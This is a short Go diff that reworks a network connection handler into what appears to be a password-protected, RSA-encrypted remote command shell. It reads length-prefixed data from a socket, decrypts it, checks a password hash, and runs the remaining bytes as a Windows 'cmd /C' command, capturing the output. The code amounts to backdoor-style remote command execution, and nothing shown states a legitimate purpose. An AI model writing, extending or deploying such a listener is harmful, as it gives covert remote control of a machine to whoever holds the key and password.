@@ -15,15 +15,33 @@ var pwHash [sha256.Size]byte
 var pub *rsa.PublicKey
 var priv *rsa.PrivateKey
 
+func downloadData(conn net.Conn) []byte {
+	var buf, data []byte
+	for {
+		buf = make([]byte, 1)
+		conn.Read(buf)
+		amtToGet := uint8(buf[0])
+		if amtToGet == 0 {
+			break
+		}
+		buf = make([]byte, amtToGet)
+		conn.Read(buf)
+		data = append(data, buf...)
+	}
+	return data
+}
 func handleconn(conn net.Conn) {
-	b := make([]byte, 232)
-	conn.Read(b)
+	b := downloadData(conn)
+	b, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, b, []byte("label"))
+	if err != nil || len(b) < 32 {
+		return
+	}
 	if sha256.Sum256(b[:32]) == pwHash {
-		end := 32
+		/*end := 32
 		for end < len(b) && b[end] != byte(0) {
 			end++
-		}
-		cmd := exec.Command("cmd", "/C", string(b[32:end]))
+		}*/
+		cmd := exec.Command("cmd", "/C", string(b[32: /*end*/]))
 		var output bytes.Buffer
 		cmd.Stdout = &output
 		err := cmd.Run()
